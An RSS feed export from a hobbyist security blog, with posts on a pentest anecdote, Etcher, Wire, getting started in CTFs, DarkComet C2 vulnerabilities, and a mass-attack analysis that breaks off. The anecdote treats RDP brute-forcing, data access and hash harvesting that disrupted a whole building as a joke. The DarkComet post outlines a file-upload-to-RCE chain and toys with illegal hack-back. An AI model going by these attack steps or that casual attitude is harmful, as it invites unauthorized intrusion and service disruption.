@@ -1,0 +1,346 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Fun &#8211; ~# Hackonch !</title>
+	<atom:link href="https://hackonch.ml/category/fun/feed/" rel="self" type="application/rss+xml" />
+	<link>https://hackonch.ml</link>
+	<description>Security rhymes with Liberty</description>
+	<lastBuildDate>Mon, 19 Aug 2019 17:46:17 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.2.2</generator>
+
+<image>
+	<url>https://hackonch.ml/wp-content/uploads/2019/08/f56f9-favicon-1-150x150.png</url>
+	<title>Fun &#8211; ~# Hackonch !</title>
+	<link>https://hackonch.ml</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>How to lose your information system on a print server</title>
+		<link>https://hackonch.ml/fun/how-to-lose-your-information-system-on-a-print-server/</link>
+				<pubDate>Wed, 07 Aug 2019 08:11:59 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Fun]]></category>
+
+		<guid isPermaLink="false">https://tchernobyl.altervista.org/?p=1417</guid>
+				<description><![CDATA[<div class="post-excerpt">Hi everyone, A short time ago, one of my friends passionate into pentesting told me an anecdote. I want to make it clear that it is 100% truth and it&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fun/how-to-lose-your-information-system-on-a-print-server/" class="btn btn-primary btn-effect btn-lg"><span>View Post</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fun/how-to-lose-your-information-system-on-a-print-server/">How to lose your information system on a print server</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Hi everyone,</p>
+<p>A short time ago, one of my friends passionate into pentesting told me an anecdote. I want to make it clear that it is 100% truth and it happened in a medium-sized IT services company based in the US. Here we go !</p>
+<h3> Introduction </h3>
+<p>Last week, I was given access to a network that seemed at first sight quite secure.</p>
+<p>As I am a little curious, the first thing I did when I settled was to run a network scan to see how many hosts were active and to have a vague idea of ​​the IS (Information System) of the company. All I had as information at this point was my IP address which informed me the address range of the floor. It was a tasty /24 as we like at a maximum of 254 hosts for the floor.</p>
+<p>So I let nmap do his job with the information I had and when it finished, almost all devices were directly visible. I launched nmap a second time on a random host to see if something change. I compared then the second result with the first and I found something interesting. As the port 445 was open on almost all machines, I tried to launch an EternalBlue attack against a few hosts, but the connection failed every time I tried. Probably a firewall might block the connection but while trying to figure out what happened, I noticed another clue: a previously targeted device was named &#8220;PRINT-PC&#8221;.</p>
+<p>Definitely curious about this strange device pretending to be a printer, I launched a third scan on it and I noted in addition to the Samba port (445) that the RDP port (3389) was also open. Naturally, I went to brute force the RDP (Remote Desktop Protocol) password by taking care to use the username, I previously collected from the Eternalblue first try. After an &#8220;Eternal&#8221; minute, the software got stuck and repeats 1234 giving an error on each attempt. I open my RDP client to see what&#8217;s wrong and &#8230;</p>
+<p><center><img src = "https://i.stack.imgur.com/o6GOJ.png" alt = "OMG" /><figcaption> The password was really 1234! 😱 </figcaption></center></p>
+<p>I walked a little on the account I successfully broke in and, after digging a little, I found informations to say at least sensitive. About 2 GB of data in all. Afterwards, I didn&#8217;t miss to report the issue to the technical team.</p>
+<p>It was at this exact moment, I had the worse idea that will, in less than 10 minutes, lead to a total chaos in the whole building. The idea was quite simple, if on a random floor, there is a device called &#8220;PRINT-PC&#8221;, it would probably mean that, there is a device called &#8220;PRINT-PC&#8221; on all other floors. No sooner said than done, I tried to connect to the same address by changing only the floor number with the same login. It worked once, twice, thrice and then I realized it would work with all other floors.</p>
+<p>After that, I ran a well-known script to retrieve the NTMLv2 hashes to attempt a privilege escalation (the logical next step). Luckily I got almost all the hashes of all users in the building. The less glamorous thing though, was I made some noise in the network: the script broadcasted my IP on the PBX used by the staff directly from their machines and not from an external Cisco phone and that&#8217;s how after 5 minutes, I heard everyone complaining that &#8220;nothing was working&#8221;, not even the phones!</p>
+<p><center><img src = "https://media.giphy.com/media/An4MkAbxeiyqY/giphy.gif" alt = "OMG" /></center></p>
+<p>Despite all the panic, I still managed to do my little privilege escalation and open on a station near me a command prompt with the administrator rights! And although it&#8217;s true that just after, I had a hard time with the IT team, this story anecdote did my week!</p>
+<h3> Conclusion </h3>
+<p>Unfortunately, a poorly protected Windows printer server is enough to break all the security of an Information System. Add to the recipe a bit of luck (or bad luck) and you will an unseen chaos which can turn any normal day of a lambda employee into a remake of World War Z !!</p>
+<p>Voilà ! I hope you enjoyed this short anecdote. Feel free to share it with your friends or colleagues! I&#8217;ll see you soon for a new article and why not a new story 🤠</p>
+<p>In the meantime, be brave (why not ?), be kind with lamas and see you soon!</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fun/how-to-lose-your-information-system-on-a-print-server/">How to lose your information system on a print server</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Etcher or how to burn an .iso / .img on Linux, Mac OS and even Windows</title>
+		<link>https://hackonch.ml/diy/etcher-or-how-to-burn-an-iso-img-on-linux-mac-os-and-even-windows/</link>
+				<comments>https://hackonch.ml/diy/etcher-or-how-to-burn-an-iso-img-on-linux-mac-os-and-even-windows/#respond</comments>
+				<pubDate>Fri, 12 Jul 2019 16:18:17 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[DIY]]></category>
+		<category><![CDATA[Fun]]></category>
+		<category><![CDATA[System]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=1189</guid>
+				<description><![CDATA[<div class="post-excerpt">Hi everyone, Do you know &#8220;dd&#8221;? No ? This is a small GNU binary, surely one of the most essential that could exists. It allows you to do a lot&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/diy/etcher-or-how-to-burn-an-iso-img-on-linux-mac-os-and-even-windows/" class="btn btn-primary btn-effect"><span>View Post</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/diy/etcher-or-how-to-burn-an-iso-img-on-linux-mac-os-and-even-windows/">Etcher or how to burn an .iso / .img on Linux, Mac OS and even Windows</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Hi everyone,</p>
+<p>Do you know &#8220;dd&#8221;? No ? This is a small GNU binary, surely one of the most essential that could exists. It allows you to do a lot of things. It cas even make your USB devices/SD cards &#8220;bootable&#8221;.</p>
+<p>For those who are already a lost, know that when you want to &#8220;burn&#8221; an operating system in order to install it, the real action is to make your device ( USB key, SD card, external hard drive &#8230;) &#8220;bootable&#8221;. For the purists, I&#8217;m aware that it&#8217;s not exactly that but hey! Keep in mind that you read a &#8220;reminder&#8221; 🤠</p>
+<p><center><img src = "https://i.imgur.com/ajIAehf.jpg"></p>
+<figure> &#8220;dd&#8221; would not sound like the diminutive for the Mother of Dragons? </figure>
+<p></center></p>
+<p>The issue with this wonder of nature (dd, not Daenerys !!) is that like many wonders of that kind, you have to put your hands in the grease to use it because it&#8217;s not for beginners on Mac OS nor Windows. This is why there are essentially only people who have already been able to manipulate a Linux who know &#8220;dd&#8221;.</p>
+<p><center><img src = "https://i.imgur.com/oAdiJVV.jpg"><figcaption> This gentleman seems to know &#8220;dd&#8221; </figcaption></center></p>
+<p>Until you taste to a Linux, here is a solution I&#8217;ve been using for a quite long time already: &#8220;Etcher&#8221; (or newly &#8220;Balena Etcher&#8221;).</p>
+<p>The advantage with &#8220;Etcher&#8221; is that it&#8217;s one of those cross-platform and ultra-simplistic applications I like. Indeed Etcher can as well run on Linux, Mac OS or even Windows.</p>
+<p>The interface is hyper simplistic:</p>
+<p><center><img src = "https://i.imgur.com/Vw5Ymue.png"></center></p>
+<p>There are literally three buttons, I don&#8217;t think we can do more &#8220;user friendly&#8221; </p>
+<p>Thus, to make any storage bootable, you must:</p>
+<p>1 °) Select the image .iso/.img of the operating system you want to install<br />
+2 °) Select the removable storage (USB key, external hard disk, SD card, &#8230;)<br />
+3 °) &#8220;Flash!&#8221; or press the last button to make the removable storage &#8220;bootable&#8221; 🤠</p>
+<p><center><img src = "https://i.imgur.com/iZrydEH.jpg"></p>
+<figure> I wouldn&#8217;t said better 🤠</figure>
+<p></center></p>
+<h3> Verdict </h3>
+<p>Etcher does not replace &#8220;dd&#8221; but allows you at least to make ALL (and I mean all) devices you attach to your computer fully &#8220;bootable&#8221;.</p>
+<p>Which is, it must be admitted, quite useful when you break your Linux because of a bet with your friends and you&#8217;re in trouble because the only computer available to flash your USB stick is an old fashioned Mac OS or a rotten Windows (Sounds like there&#8217;s a story 🤠)</p>
+<p>In addition, I find this tool puts a real order in all the whole bunch of &#8220;Unetbootin,&#8221; Rufus &#8220;,&#8221; Linux live iso &#8220;and derivatives of all kinds which I find too unnecessary difficult to use .</p>
+<p>Voilà ! I hope you enjoyed this article, don&#8217;t hesitate to make your own idea and comment. We don&#8217;t change good habits, if you found this little DIY useful, spread it ! I&#8217;ll see you soon for a new article!</p>
+<p>Until then, stay cool with monkeys and drink water because water is water and water is life !!</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/diy/etcher-or-how-to-burn-an-iso-img-on-linux-mac-os-and-even-windows/">Etcher or how to burn an .iso / .img on Linux, Mac OS and even Windows</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
+]]></content:encoded>
+							<wfw:commentRss>https://hackonch.ml/diy/etcher-or-how-to-burn-an-iso-img-on-linux-mac-os-and-even-windows/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+							</item>
+		<item>
+		<title>Wire as a good replacement for Skype</title>
+		<link>https://hackonch.ml/system/wire-as-a-good-replacement-for-skype/</link>
+				<comments>https://hackonch.ml/system/wire-as-a-good-replacement-for-skype/#respond</comments>
+				<pubDate>Mon, 08 Jul 2019 23:35:34 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Privacy]]></category>
+		<category><![CDATA[System]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=1180</guid>
+				<description><![CDATA[<div class="post-excerpt">Hi everyone, If as me, you live in a cave, know that Microsoft will stop the Skype project development! When Microsoft announced it quietly 🤠 I realize that some people&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/system/wire-as-a-good-replacement-for-skype/" class="btn btn-primary btn-effect"><span>View Post</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/system/wire-as-a-good-replacement-for-skype/">Wire as a good replacement for Skype</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Hi everyone,</p>
+<p>If as me, you live in a cave, know that Microsoft will stop the Skype project development!</p>
+<p><center><img src = "https://media.giphy.com/media/joV1k1sNOT5xC/giphy.gif" alt = "skype"><figcaption> When Microsoft announced it quietly 🤠 </figcaption></center></p>
+<p>I realize that some people won&#8217;t even find the usefulness of making a post on it but for the others (and I know a lot !) who can&#8217;t simply imagine the word &#8220;Videoconference&#8221; rhyme with anything other than Skype, I have something that might interest you:</p>
+<h3> Wire </h3>
+<h3> 1 °) What is it? </h3>
+<p>Wire is above all a compagny but it&#8217;s also a fully open source and cross-platform software, which means that you can install it either on Linux, Mac OS, Android, IOS or even Windows. But before you install it, there are several &#8220;plans&#8221; a bit like slack for those who know. So you can create two kinds of account on the site &#8220;business&#8221; (paying) or &#8220;personal&#8221; (free), a mail and a password are more than enough to create a personal account.</p>
+<p><center><img src = "https://media.giphy.com/media/3o7TKrugYn6cXQAMTK/giphy.gif" alt = "applause"><figcaption> Minimalism folks, minimalism 🤠 !</figcaption></center></p>
+<h3> 2 °) Features </h3>
+<p>Once your account is created and the app is installed, there&#8217;s not much left to do:</p>
+<p><center><img src = "https://gigaom2.files.wordpress.com/2014/12/wire-screenshot-2.jpeg" alt = "macos"><figcaption> Wire on Mac OS 🤠 </figcaption></center>You can do everything as you would do on Skype, create conversation groups, add people to contacts, share your screen or your camera, share images,&#8230; All of that without having this feeling of being constantly monitored by the NSA or any other privacy killer. Indeed, all communications are encrypted end-to-end ! Which means that except the person you are chatting with, no one will know that your dog is called Medor, and not even Wire!</p>
+<p>Here is the icing on the cake: Wire does not serve any ads (yup, it is still possible in 2019).</p>
+<p><center><img src = "https://media.giphy.com/media/5VKbvrjxpVJCM/giphy.gif" alt = "macos"><figcaption> The epic face I&#8217;ve made when I saw there was 0% of ads 🤠 </figcaption></center></p>
+<h3> 3 °) Verdict </h3>
+<p>You may have already understood it, I&#8217;m totally under the spell of Wire. I have honestly tried a myriade of replacements to Skype and even Discord (yes, yes it&#8217;s possible), but every time there was something wrong. Except for Wire, where everything works like a charm, the quality of the audio, the design, everything is tasty!</p>
+<p>Voilà ! I hope you enjoyed this post, don&#8217;t hesitate to make your own idea and comment. We don&#8217;t change good habits, if you found this post useful, spread it ! I&#8217;ll see you soon for a new article!</p>
+<p>Until then, stay away from barbed wire and enjoy free <del>candies</del> softwares !!</p>
+<p>NB: I&#8217;m not paid by Wire, it&#8217;s only my personal opinion about it ! </p>
+<h3> Some links </h3>
+<p>official website: <a href="https://wire.com/en/" rel="noopener noreferrer" target="_blank"> https://wire.com/en/ </a><br />
+download: <a href="https://wire.com/en/download/" rel="noopener noreferrer" target="_blank"> https://wire.com/en/download/ </a></p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/system/wire-as-a-good-replacement-for-skype/">Wire as a good replacement for Skype</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
+]]></content:encoded>
+							<wfw:commentRss>https://hackonch.ml/system/wire-as-a-good-replacement-for-skype/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+							</item>
+		<item>
+		<title>How to get started into CTF&#8217;s</title>
+		<link>https://hackonch.ml/diy/how-to-get-started-into-ctfs/</link>
+				<comments>https://hackonch.ml/diy/how-to-get-started-into-ctfs/#respond</comments>
+				<pubDate>Wed, 22 May 2019 15:46:52 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[DIY]]></category>
+		<category><![CDATA[Fun]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=1026</guid>
+				<description><![CDATA[<div class="post-excerpt">Hi everyone ! Many people asked me to write a little post on how to get started into CTF&#8217;s, so here it is ! 1°) The equipment We don&#8217;t make&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/diy/how-to-get-started-into-ctfs/" class="btn btn-primary btn-effect"><span>View Post</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/diy/how-to-get-started-into-ctfs/">How to get started into CTF&#8217;s</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Hi everyone !</p>
+<p>Many people asked me to write a little post on how to get started into CTF&#8217;s, so here it is !</p>
+<h3> 1°) The equipment </h3>
+<blockquote><p> We don&#8217;t make omelettes without breaking eggs, but to do so, we need some eggs! </p></blockquote>
+<p>Yup! the equipment is pretty important. In fact for Capture The Flags, there&#8217;s no need of a performance beast. For example, when I started, I remember this old Nec m320 dating back to 2003 and weighing at least 5 kg and even it wasn&#8217;t a luxury, I still have great memories with.</p>
+<p><center><img src="https://www.diltoo.com/Photos/27/27550-ordinateur-portable-nec-1.jpg" width="450" ​​height="600" class="alignnone size-full wp-image-1027" /><figcaption> Aaahh the beautiful era of portable computers that had the same weight as a potato bag 🤠 </figcaption></center></p>
+<p>In short, it&#8217;s not necessary at all to invest into gamers PC at € 2,000 each, only for CTF&#8217;s&#8217;s. We can recycle an old computer to begin with.</p>
+<p>On the other hand what is AB-SO-LU-TE-LY needed is an adequate operating system. No more Windows 10 or even Mac OS X! What you need is a Linux one 🐧</p>
+<p><center><img src="https://memegenerator.net/img/instances/61963857/linux-linux-everywhere.jpg" alt="linux everywhere" /></center></p>
+<p>There is indeed a good panel of Linux distributions specialized in computer security but my little personal top list remains the following:</p>
+<ul>
+<li><a href="https://www.kali.org/" rel="noopener noreferrer" target="_blank"> Kali Linux </a> (formerly Backtrack, user friendly) </li>
+<li><a href="https://archstrike.org/" rel="noopener noreferrer" target="_blank"> Archstrike </a> (not for beginners ⚠️) </li>
+<li><a href="https://www.backbox.org/" rel="noopener noreferrer" target="_blank"> Back Box </a> (based on Ubuntu) </li>
+<li><a href="https://www.parrotsec.org/" rel="noopener noreferrer" target="_blank"> Parrot OS </a> (a fork of Kali Linux) </li>
+</ul>
+<p>It is quite important that you forge your own opinion later. But to begin with, the overwhelming majority will chose Kali Linux. It&#8217;s pretty stable distribution, based on Debian and in addition the community is consequent. Which means that most compatibility issues concerning, as instance drivers, may have already an online workaround, that&#8217;s pretty cool especially when you are a beginner 🤠.</p>
+<h3> 2°) Where to find CTF&#8217;s images? </H3></p>
+<p>A CTF is primarily a disk image file&#8230; but not that only. Indeed, in my previous article, I dealed with a site (<a href="https://www.vulnhub.com/" rel="noopener noreferrer" target="_blank"> Vulnhub </a> ) which provides a large choice of image files to be download. These images can easily be mounted locally on a virtual machine (Virtual Box or KVM).</p>
+<p>But it may be a real headache for a beginner. That&#8217;s why other sites exist:</p>
+<p>We can mention <a href="https://www.root-me.org/" rel="noopener noreferrer" target="_blank"> Root-Me </a>, which is a French multilingual association aiming to promote knowledge about piracy and information security. The platform provides all well done challenges in various categories (Network, programming, Web, steganography, foresics, etc &#8230;) in addition to a CTF section where several slots are available to the community with a wide choice of images. To be an active member and supporting the association I must admit, this is a nice project.</p>
+<p>For those who prefer a EU-wide community, <a href="https://www.hackthebox.eu/" rel="noopener noreferrer" target="_blank"> Hack The Box </a> is also a good address. The plateform is specialized in CTF&#8217;s. The images are handmade exclusively by comunity members. Just as Root-Me there is zero configuration to deal with, everything is online. Only a <a href="https://blog.tchernobyl.ml/diy/monter-son-own-vpn-like-a-nul-introduction/" rel="noopener noreferrer" target="_blank"> VPN </a> must be configured but everything is well explained on the site.</p>
+<p>I think I went around for the best sites where you can enjoy tasty CTF&#8217;s, if you know other sites, I would be more than happy to add them to the list !</p>
+<h3> 3°) Go, go, Power Rangers ! </h3>
+<p>Now: we have everything we need, it&#8217;s time to have fun until the Defcon or any other local cybersecurity event. For example, for me it&#8217;s La Nuit Du Hack ! (or newly &#8220;Le hack&#8221;) in France.</p>
+<p>Voilà ! I hope you enjoyed this post, don&#8217;t hesitate to make your own idea and comment. We don&#8217;t change good habits, if you found this post useful, spread it ! I&#8217;ll see you soon for a new article!</p>
+<p>Until then, stay a cool hacker and eat some watermelon because watermelon are so cool !!</p>
+<h3> Some links </h3>
+<p><a href="https://www.kali.org/" rel="noopener noreferrer" target="_blank">https://www.kali.org/</a>   &#8211; Kali Linux<br />
+<a href="https://archstrike.org/" rel="noopener noreferrer" target="_blank">https://archstrike.org/</a> &#8211; ArchStrike<br />
+<a href="https://www.backbox.org/" rel="noopener noreferrer" target="_blank">https://www.backbox.org/</a>    &#8211; BackBox<br />
+<a href="https://www.parrotsec.org/" rel="noopener noreferrer" target="_blank">https://www.parrotsec.org/</a>  &#8211; Parrot OS</p>
+<p><a href="https://www.root-me.org/" rel="noopener noreferrer" target="_blank">https://www.root-me.org/</a>    &#8211; Root-Me<br />
+<a href="https://www.hackthebox.eu/" rel="noopener noreferrer" target="_blank">https://www.hackthebox.eu/</a>  &#8211; Hack The Box<br />
+<a href="https://www.vulnhub.com/" rel="noopener noreferrer" target="_blank">https://www.vulnhub.com/</a>    &#8211; Vulnhub</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/diy/how-to-get-started-into-ctfs/">How to get started into CTF&#8217;s</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
+]]></content:encoded>
+							<wfw:commentRss>https://hackonch.ml/diy/how-to-get-started-into-ctfs/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+							</item>
+		<item>
+		<title>Malware Hunting : The end of DarkComet</title>
+		<link>https://hackonch.ml/fun/malware-hunting-the-end-of-darkcomet/</link>
+				<comments>https://hackonch.ml/fun/malware-hunting-the-end-of-darkcomet/#respond</comments>
+				<pubDate>Tue, 14 May 2019 18:36:13 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Malware-Hunting]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=983</guid>
+				<description><![CDATA[<div class="post-excerpt">Hi everyone! I don&#8217;t know about you but when I was younger, there was a huge trend into making videos about hacking tutorials on Windows. It was also at that&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fun/malware-hunting-the-end-of-darkcomet/" class="btn btn-primary btn-effect"><span>View Post</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fun/malware-hunting-the-end-of-darkcomet/">Malware Hunting : The end of DarkComet</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Hi everyone!</p>
+<p>I don&#8217;t know about you but when I was younger, there was a huge trend into making videos about hacking tutorials on Windows. It was also at that time that tools like <strong> LOIC </strong> became so popular. Hacking has became literally a &#8220;point to click&#8221; concept, as in video games.</p>
+<p>We will deal today a with software that also became popular at that time: <strong> DarkComet </strong></p>
+<h3> A bit of History </h3>
+<p>DarkComet was a Trojan horse (a type of software known by its abbreviation &#8220;RAT&#8221;) developed by an independent French programmer.</p>
+<p>Although this software was developed in 2008, it began to proliferate in early 2012. The software development was canceled, partly because of its misuse during the Syrian civil war to monitor activists, but also because his creator was afraid to be arrested.</p>
+<h3> Usage </h3>
+<p>It should be noted that even if its development was stopped in July 2012, the software is still widely used as shown by these fresh statistics I concocted with the help of Shodan:</p>
+<p><center><img src = "https://i.imgur.com/4qYKNRm.jpg" alt = "" width = "800" height = "600" class = " alignnone size-medium wp-image-1002 "/><figcaption> C&#038;C distribution in France among the 5 most used trojans</figcaption></center></p>
+<p>As can be seen, more than 50% of the 5 most common Trojan horses detected by Shodan in France are DarkComet servers.</p>
+<p>If the patriotic hack back was authorized as in the previous post, it would probably be necessary to attack DarkComet C2C servers because they are widely used.</p>
+<h3> What we already know </h3>
+<p>Darkcomet has been vulnerable in the past. In fact, since 2015, we know that it&#8217;s possible to lead to an arbitrary File Download on any DarkComet C2C server. A good starting point would be to examine the functionality of DarkComet file sending (from attacker to victim).</p>
+<p>The server uses a very specific transaction model that looks like this (&#8220;S&#8221; refers to the server and &#8220;I&#8221; the infected computer):</p>
+<p><Pre><br />
+S: QUICKUP C: file.jpg | 123 | UploadExec<br />
+The client initiates a new connection with &#8220;QUICKUP&#8221;</p>
+<p>I: QUICKUP 123 | C: file.jpg | UploadExec<br />
+S: &#8220;x41x00x43&#8221;<br />
+I: Ack<br />
+S: &#8220;file length&#8221;<br />
+I: Ack<br />
+S: &#8220;raw binary stream&#8221;<br />
+</Pre></p>
+<p>The C&#038;C server doesn&#8217;t check if it has already issued a download command. This means that anyone connecting to the server can download any file from the server.<br />
+Unfortunately, since there is no way for the server to list all the files in a directory, this vulnerability is limited to downloading files known to the attacker.</p>
+<p>Among the various files that can be reached, we can have fun targeting two sensitive files for the server:</p>
+<p>1°) comet.db which, as the name suggests, is a database (SQLite) actually containing a list of all infected computers (including IP/MAC addresses, Country, current user name, operating system version,&#8230;). This database can also contain keystroke recording data.</p>
+<p>2°) config.ini which contains all passwords in plain text related to the the DarkComet server configuration.</p>
+<p>As said previsouly, this vulnerability is interesting to say the least but unfortunately, it doesn&#8217;t allow us directly to get stable foothold on the server.</p>
+<h3> A bit of research </h3>
+<p>Let&#8217;s take a look now at the downloading function (from victim to attacker).<br />
+When the DarkComet server tries to download a file, here&#8217;s what actually happens:</p>
+<p><Pre><br />
+S: DOWNLOADFILE 596 | C: file.jpg<br />
+The client then opens a new connection:</p>
+<p>I: FILETRANSFER | 596<br />
+S: &#8220;x41x00x43&#8221;<br />
+I: FILEBOF C: file.jpg | 0<br />
+S: Ack<br />
+I: &#8220;raw binary stream&#8221;<br />
+</Pre></p>
+<p>The server write the file to a directory specified by the user with the name &#8220;file.jpg&#8221;. Although it may seem as exploitable as the previous function, it&#8217;s unfortunately not. In fact, the 596 in &#8220;DOWNLOADFILE 596&#8221; is the identifier of a<a href="https://en.wikipedia.org/wiki/Socket" rel="noopener noreferrer" target="_blank"> socket </a>. The server wouldn&#8217;t accept FILETRANSFER | 596 if it has not previously issued on an identical socket.</p>
+<p>It&#8217;s not obvious at first sight but the vulnerability is there. I let the detail to the comrade <strong> PseudoLaboratories </strong> for those interested.</p>
+<p>All that to say that the exploitation of the vulnerability leads us to an arbitrary file sending. Wich we can use to provoke a: *roll of drums* &#8230;</p>
+<h3> Remote Code Execution !</h3>
+<p>The DarkComet server will try to use UPnP by default in order to open ports automatically. To achieve this, it actually writes a file called &#8220;upnp.exe&#8221; to the Temp directory and run it, if necessary.</p>
+<p>We could use at first, the arbitrary file download vulnerability to read the current username and then in a second part, we could use the arbitrary file upload in order to send a payload right in the Temp directory. Boom !</p>
+<p>At the next server restart, &#8220;upnp.exe&#8221; (overwritten by our payload) will be executed.</p>
+<h3> Privilege escalation </h3>
+<p>The logical next step in the actual pwnage would be to find a way to get administrator privileges but Darkcomet already dit the job !</p>
+<p>Yep, as the software requests administrator privileges at each startup, by inheritance principle, any code executed by Darkcomet is executed with administrator rights, including our payload.</p>
+<h3> Conclusion </h3>
+<p>DarkComet is a highly developed software, so much that it&#8217;s the most popular trojan in France and in many countries worldwide. It&#8217;s certain that if the software development wasn&#8217;t be terminated. The flaws mentioned in this article wouldn&#8217;t be exploitable.</p>
+<p>But with this in mind and if it wasn&#8217;t illegal to hack back bad guys, we could clean up to 50% C2C servers in France and maybe more in other countries.</p>
+<p>I hope you liked this article, feel free to leave a comment, a remark, or even a message (I read them all !!)</p>
+<p>In my case, I was delighted to write this article, I haven&#8217;t yet chosen my next victim so don&#8217;t hesitate to send me ideas 🤠</p>
+<h3> Sources </h3>
+<p>https://pseudolaboratories.github.io/DarkComet-upload-vulnerability/<br />
+https://www.shodan.io/<br />
+https://techanarchy.net/blog/darkcomet-hacking-the-hacker<br />
+https://fr.wikipedia.org/wiki/DarkComet</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fun/malware-hunting-the-end-of-darkcomet/">Malware Hunting : The end of DarkComet</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
+]]></content:encoded>
+							<wfw:commentRss>https://hackonch.ml/fun/malware-hunting-the-end-of-darkcomet/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+							</item>
+		<item>
+		<title>Analysis of a Chinese Mass Attack (ft. Codoso Team)</title>
+		<link>https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/</link>
+				<comments>https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/#respond</comments>
+				<pubDate>Sat, 20 Apr 2019 18:05:28 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Malware-Hunting]]></category>
+		<category><![CDATA[Web]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=796</guid>
+				<description><![CDATA[<div class="post-excerpt">Hi everyone ! As you may know, I&#8217;m not joking with cybersecurity. Which means I&#8217;m not joking with the blog. That being said, a good way to ensure the safety&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/" class="btn btn-primary btn-effect"><span>View Post</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/">Analysis of a Chinese Mass Attack (ft. Codoso Team)</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Hi everyone !</p>
+<p>As you may know, I&#8217;m not joking with cybersecurity. Which means I&#8217;m not joking with the blog. That being said, a good way to ensure the safety of its own equipment is to periodically peel the log files.</p>
+<h3> 1°) The Context </h3>
+<p>A few days ago, I noticed that more than 50% of http requests received to my website are not actually visitors but hosts targeting the entire internet for vulnerable servers. This is called &#8220;mass attacks&#8221;.</p>
+<p>Even if they could be impressive, these mass attacks are very unsophisticated and good practices are generally more than enough to make it meaningless.</p>
+<p>However, there was this request, punctual, and quite sophisticated:</p>
